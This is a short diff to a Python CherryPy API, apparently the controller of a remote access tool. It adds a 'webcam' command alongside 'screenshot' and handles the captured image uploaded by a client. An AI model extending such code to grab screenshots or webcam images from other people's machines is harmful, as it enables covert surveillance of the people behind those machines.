@@ -261,8 +261,10 @@ class API(object):
                 if end_pos != -1:
                     upload_filename = upload_filename[:end_pos]
                 pending_uploads.append(os.path.basename(upload_filename))
-        if cmd.startswith("screenshot"):
+        elif cmd.startswith("screenshot"):
             pending_uploads.append("screenshot")
+        elif cmd.startswith("webcam"):
+            pending_uploads.append("webcam")
 
     @cherrypy.expose
     @require_admin
@@ -302,6 +304,8 @@ class API(object):
             pending_uploads.remove(expected_file)
         elif "screenshot" in pending_uploads:
             pending_uploads.remove("screenshot")
+        elif "webcam" in pending_uploads:
+            pending_uploads.remove("webcam")
         else:
             print "Unexpected file: %s" % src
             raise cherrypy.HTTPError(403)
